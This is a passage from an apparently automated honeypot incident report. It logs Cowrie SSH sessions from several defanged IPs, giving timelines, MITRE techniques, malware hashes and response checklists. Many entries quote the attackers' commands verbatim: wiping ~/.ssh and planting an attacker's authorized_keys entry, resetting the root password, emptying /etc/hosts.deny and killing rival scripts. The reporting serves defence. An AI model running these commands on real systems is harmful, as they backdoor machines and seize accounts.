| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:41:06` | `cowrie.session.connect` |
| `2026-04-17 09:41:06` | `cowrie.client.version` |
| `2026-04-17 09:41:06` | `cowrie.client.kex` |
| `2026-04-17 09:41:07` | `cowrie.login.success` |
| `2026-04-17 09:41:07` | `cowrie.session.params` |
| `2026-04-17 09:41:07` | `cowrie.command.input` |
| `2026-04-17 09:41:07` | `cowrie.command.failed` |
| `2026-04-17 09:41:07` | `cowrie.log.closed` |
| `2026-04-17 09:41:08` | `cowrie.session.params` |
| `2026-04-17 09:41:08` | `cowrie.command.input` |
| `2026-04-17 09:41:08` | `cowrie.session.file_download` |
| `2026-04-17 09:41:08` | `cowrie.log.closed` |
| `2026-04-17 09:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2e3ccf85d3

| Field | Detail |
|---|---|
| **Source IP** | `58.229.141[.]26` |
| **First Seen** | 2026-04-17 09:41 |
| **Last Seen** | 2026-04-17 09:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:41:10` | `cowrie.session.connect` |
| `2026-04-17 09:41:10` | `cowrie.client.version` |
| `2026-04-17 09:41:10` | `cowrie.client.kex` |
| `2026-04-17 09:41:10` | `cowrie.login.success` |
| `2026-04-17 09:41:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.141[.]26` to AbuseIPDB if not already reported
- [ ] Block `58.229.141[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0625f16bd11

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:42 |
| **Last Seen** | 2026-04-17 09:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:42:44` | `cowrie.session.connect` |
| `2026-04-17 09:42:44` | `cowrie.client.version` |
| `2026-04-17 09:42:44` | `cowrie.client.kex` |
| `2026-04-17 09:42:45` | `cowrie.login.success` |
| `2026-04-17 09:42:45` | `cowrie.session.params` |
| `2026-04-17 09:42:45` | `cowrie.command.input` |
| `2026-04-17 09:42:45` | `cowrie.command.failed` |
| `2026-04-17 09:42:46` | `cowrie.log.closed` |
| `2026-04-17 09:42:46` | `cowrie.session.params` |
| `2026-04-17 09:42:46` | `cowrie.command.input` |
| `2026-04-17 09:42:46` | `cowrie.session.file_download` |
| `2026-04-17 09:42:46` | `cowrie.log.closed` |
| `2026-04-17 09:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb4b1eab89bb

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:42 |
| **Last Seen** | 2026-04-17 09:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:42:48` | `cowrie.session.connect` |
| `2026-04-17 09:42:48` | `cowrie.client.version` |
| `2026-04-17 09:42:49` | `cowrie.client.kex` |
| `2026-04-17 09:42:49` | `cowrie.login.success` |
| `2026-04-17 09:42:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-824b1b6eaa33

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:44 |
| **Last Seen** | 2026-04-17 09:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:44:29` | `cowrie.session.connect` |
| `2026-04-17 09:44:29` | `cowrie.client.version` |
| `2026-04-17 09:44:29` | `cowrie.client.kex` |
| `2026-04-17 09:44:30` | `cowrie.login.success` |
| `2026-04-17 09:44:30` | `cowrie.session.params` |
| `2026-04-17 09:44:30` | `cowrie.command.input` |
| `2026-04-17 09:44:30` | `cowrie.command.failed` |
| `2026-04-17 09:44:30` | `cowrie.log.closed` |
| `2026-04-17 09:44:31` | `cowrie.session.params` |
| `2026-04-17 09:44:31` | `cowrie.command.input` |
| `2026-04-17 09:44:31` | `cowrie.session.file_download` |
| `2026-04-17 09:44:31` | `cowrie.log.closed` |
| `2026-04-17 09:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a13279b811ab

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:44 |
| **Last Seen** | 2026-04-17 09:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:44:35` | `cowrie.session.connect` |
| `2026-04-17 09:44:35` | `cowrie.client.version` |
| `2026-04-17 09:44:35` | `cowrie.client.kex` |
| `2026-04-17 09:44:36` | `cowrie.login.success` |
| `2026-04-17 09:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9473c6f85de6

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:46 |
| **Last Seen** | 2026-04-17 09:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:46:19` | `cowrie.session.connect` |
| `2026-04-17 09:46:19` | `cowrie.client.version` |
| `2026-04-17 09:46:19` | `cowrie.client.kex` |
| `2026-04-17 09:46:20` | `cowrie.login.success` |
| `2026-04-17 09:46:20` | `cowrie.session.params` |
| `2026-04-17 09:46:20` | `cowrie.command.input` |
| `2026-04-17 09:46:20` | `cowrie.command.failed` |
| `2026-04-17 09:46:20` | `cowrie.log.closed` |
| `2026-04-17 09:46:21` | `cowrie.session.params` |
| `2026-04-17 09:46:21` | `cowrie.command.input` |
| `2026-04-17 09:46:21` | `cowrie.session.file_download` |
| `2026-04-17 09:46:21` | `cowrie.log.closed` |
| `2026-04-17 09:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e996dcce3a48

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]76` |
| **First Seen** | 2026-04-17 09:46 |
| **Last Seen** | 2026-04-17 09:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:46:23` | `cowrie.session.connect` |
| `2026-04-17 09:46:23` | `cowrie.client.version` |
| `2026-04-17 09:46:23` | `cowrie.client.kex` |
| `2026-04-17 09:46:24` | `cowrie.login.success` |
| `2026-04-17 09:46:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.79.191[.]76` to AbuseIPDB if not already reported
- [ ] Block `210.79.191[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b78f456d0e8

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:08 |
| **Last Seen** | 2026-04-17 10:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:08:03` | `cowrie.session.connect` |
| `2026-04-17 10:08:03` | `cowrie.client.version` |
| `2026-04-17 10:08:03` | `cowrie.client.kex` |
| `2026-04-17 10:08:04` | `cowrie.login.success` |
| `2026-04-17 10:08:04` | `cowrie.session.params` |
| `2026-04-17 10:08:04` | `cowrie.command.input` |
| `2026-04-17 10:08:04` | `cowrie.command.failed` |
| `2026-04-17 10:08:04` | `cowrie.log.closed` |
| `2026-04-17 10:08:05` | `cowrie.session.params` |
| `2026-04-17 10:08:05` | `cowrie.command.input` |
| `2026-04-17 10:08:05` | `cowrie.session.file_download` |
| `2026-04-17 10:08:05` | `cowrie.log.closed` |
| `2026-04-17 10:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9c029c7394

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:08 |
| **Last Seen** | 2026-04-17 10:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:08:07` | `cowrie.session.connect` |
| `2026-04-17 10:08:07` | `cowrie.client.version` |
| `2026-04-17 10:08:07` | `cowrie.client.kex` |
| `2026-04-17 10:08:08` | `cowrie.login.success` |
| `2026-04-17 10:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]82` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4892ced1aae5

| Field | Detail |
|---|---|
| **Source IP** | `120.48.87[.]166` |
| **First Seen** | 2026-04-17 10:08 |
| **Last Seen** | 2026-04-17 10:09 |
| **Session Duration** | 49s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:BBNe1o4Qfx90"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:08:16` | `cowrie.session.connect` |
| `2026-04-17 10:08:16` | `cowrie.client.version` |
| `2026-04-17 10:08:17` | `cowrie.client.kex` |
| `2026-04-17 10:08:20` | `cowrie.login.success` |
| `2026-04-17 10:08:21` | `cowrie.session.params` |
| `2026-04-17 10:08:21` | `cowrie.command.input` |
| `2026-04-17 10:08:21` | `cowrie.command.failed` |
| `2026-04-17 10:08:21` | `cowrie.log.closed` |
| `2026-04-17 10:08:21` | `cowrie.session.params` |
| `2026-04-17 10:08:21` | `cowrie.command.input` |
| `2026-04-17 10:08:22` | `cowrie.session.file_download` |
| `2026-04-17 10:08:22` | `cowrie.log.closed` |
| `2026-04-17 10:08:34` | `cowrie.session.params` |
| `2026-04-17 10:08:34` | `cowrie.command.input` |
| `2026-04-17 10:08:34` | `cowrie.log.closed` |
| `2026-04-17 10:08:35` | `cowrie.session.params` |
| `2026-04-17 10:08:35` | `cowrie.command.input` |
| `2026-04-17 10:08:36` | `cowrie.log.closed` |
| `2026-04-17 10:08:39` | `cowrie.session.params` |
| `2026-04-17 10:08:39` | `cowrie.command.input` |
| `2026-04-17 10:08:39` | `cowrie.session.file_download` |
| `2026-04-17 10:08:39` | `cowrie.log.closed` |
| `2026-04-17 10:08:41` | `cowrie.session.params` |
| `2026-04-17 10:08:41` | `cowrie.command.input` |
| `2026-04-17 10:08:41` | `cowrie.log.closed` |
| `2026-04-17 10:08:42` | `cowrie.session.params` |
| `2026-04-17 10:08:42` | `cowrie.command.input` |
| `2026-04-17 10:08:42` | `cowrie.log.closed` |
| `2026-04-17 10:08:43` | `cowrie.session.params` |
| `2026-04-17 10:08:43` | `cowrie.command.input` |
| `2026-04-17 10:08:43` | `cowrie.command.input` |
| `2026-04-17 10:08:44` | `cowrie.log.closed` |
| `2026-04-17 10:08:45` | `cowrie.session.params` |
| `2026-04-17 10:08:45` | `cowrie.command.input` |
| `2026-04-17 10:08:48` | `cowrie.log.closed` |
| `2026-04-17 10:08:50` | `cowrie.session.params` |
| `2026-04-17 10:08:50` | `cowrie.command.input` |
| `2026-04-17 10:08:50` | `cowrie.log.closed` |
| `2026-04-17 10:08:52` | `cowrie.session.params` |
| `2026-04-17 10:08:52` | `cowrie.command.input` |
| `2026-04-17 10:08:52` | `cowrie.log.closed` |
| `2026-04-17 10:08:53` | `cowrie.session.params` |
| `2026-04-17 10:08:53` | `cowrie.command.input` |
| `2026-04-17 10:08:54` | `cowrie.log.closed` |
| `2026-04-17 10:08:55` | `cowrie.session.params` |
| `2026-04-17 10:08:55` | `cowrie.command.input` |
| `2026-04-17 10:08:55` | `cowrie.log.closed` |
| `2026-04-17 10:08:56` | `cowrie.session.params` |
| `2026-04-17 10:08:56` | `cowrie.command.input` |
| `2026-04-17 10:08:57` | `cowrie.log.closed` |
| `2026-04-17 10:08:59` | `cowrie.session.params` |
| `2026-04-17 10:08:59` | `cowrie.command.input` |
| `2026-04-17 10:08:59` | `cowrie.log.closed` |
| `2026-04-17 10:09:01` | `cowrie.session.params` |
| `2026-04-17 10:09:01` | `cowrie.command.input` |
| `2026-04-17 10:09:01` | `cowrie.log.closed` |
| `2026-04-17 10:09:02` | `cowrie.session.params` |
| `2026-04-17 10:09:02` | `cowrie.command.input` |
| `2026-04-17 10:09:03` | `cowrie.log.closed` |
| `2026-04-17 10:09:05` | `cowrie.session.params` |
| `2026-04-17 10:09:05` | `cowrie.command.input` |
| `2026-04-17 10:09:05` | `cowrie.log.closed` |
| `2026-04-17 10:09:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.87[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.87[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a787abed439

| Field | Detail |
|---|---|
| **Source IP** | `120.48.87[.]166` |
| **First Seen** | 2026-04-17 10:10 |
| **Last Seen** | 2026-04-17 10:11 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:GJjLJOLhbdfp"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 10:10:01` | `cowrie.session.connect` |
| `2026-04-17 10:10:01` | `cowrie.client.version` |
| `2026-04-17 10:10:02` | `cowrie.client.kex` |
| `2026-04-17 10:10:07` | `cowrie.login.success` |
| `2026-04-17 10:10:08` | `cowrie.session.params` |
| `2026-04-17 10:10:08` | `cowrie.command.input` |
| `2026-04-17 10:10:08` | `cowrie.command.failed` |
| `2026-04-17 10:10:09` | `cowrie.log.closed` |
| `2026-04-17 10:10:10` | `cowrie.session.params` |
| `2026-04-17 10:10:10` | `cowrie.command.input` |
| `2026-04-17 10:10:10` | `cowrie.session.file_download` |
| `2026-04-17 10:10:10` | `cowrie.log.closed` |
| `2026-04-17 10:10:23` | `cowrie.session.params` |
| `2026-04-17 10:10:23` | `cowrie.command.input` |
| `2026-04-17 10:10:23` | `cowrie.log.closed` |
| `2026-04-17 10:10:24` | `cowrie.session.params` |
| `2026-04-17 10:10:24` | `cowrie.command.input` |
| `2026-04-17 10:10:25` | `cowrie.log.closed` |
| `2026-04-17 10:10:25` | `cowrie.session.params` |
| `2026-04-17 10:10:25` | `cowrie.command.input` |
| `2026-04-17 10:10:26` | `cowrie.session.file_download` |
| `2026-04-17 10:10:26` | `cowrie.log.closed` |
| `2026-04-17 10:10:27` | `cowrie.session.params` |
| `2026-04-17 10:10:27` | `cowrie.command.input` |
| `2026-04-17 10:10:27` | `cowrie.log.closed` |
| `2026-04-17 10:10:28` | `cowrie.session.params` |
| `2026-04-17 10:10:28` | `cowrie.command.input` |
| `2026-04-17 10:10:29` | `cowrie.log.closed` |
| `2026-04-17 10:10:29` | `cowrie.session.params` |
| `2026-04-17 10:10:29` | `cowrie.command.input` |
| `2026-04-17 10:10:29` | `cowrie.command.input` |
| `2026-04-17 10:10:29` | `cowrie.log.closed` |
| `2026-04-17 10:10:30` | `cowrie.session.params` |
| `2026-04-17 10:10:30` | `cowrie.command.input` |
| `2026-04-17 10:10:32` | `cowrie.log.closed` |
| `2026-04-17 10:10:32` | `cowrie.session.params` |
| `2026-04-17 10:10:32` | `cowrie.command.input` |
| `2026-04-17 10:10:32` | `cowrie.log.closed` |
| `2026-04-17 10:10:34` | `cowrie.session.params` |
| `2026-04-17 10:10:34` | `cowrie.command.input` |
| `2026-04-17 10:10:34` | `cowrie.log.closed` |
| `2026-04-17 10:10:35` | `cowrie.session.params` |
| `2026-04-17 10:10:35` | `cowrie.command.input` |
| `2026-04-17 10:10:35` | `cowrie.log.closed` |
| `2026-04-17 10:10:36` | `cowrie.session.params` |
| `2026-04-17 10:10:36` | `cowrie.command.input` |
| `2026-04-17 10:10:36` | `cowrie.log.closed` |
| `2026-04-17 10:10:37` | `cowrie.session.params` |
| `2026-04-17 10:10:37` | `cowrie.command.input` |
| `2026-04-17 10:10:39` | `cowrie.log.closed` |
| `2026-04-17 10:10:51` | `cowrie.session.params` |
| `2026-04-17 10:10:51` | `cowrie.command.input` |
| `2026-04-17 10:10:57` | `cowrie.log.closed` |
| `2026-04-17 10:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.87[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.87[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76599893e5e6

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]82` |
| **First Seen** | 2026-04-17 10:10 |
| **Last Seen** | 2026-04-17 10:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
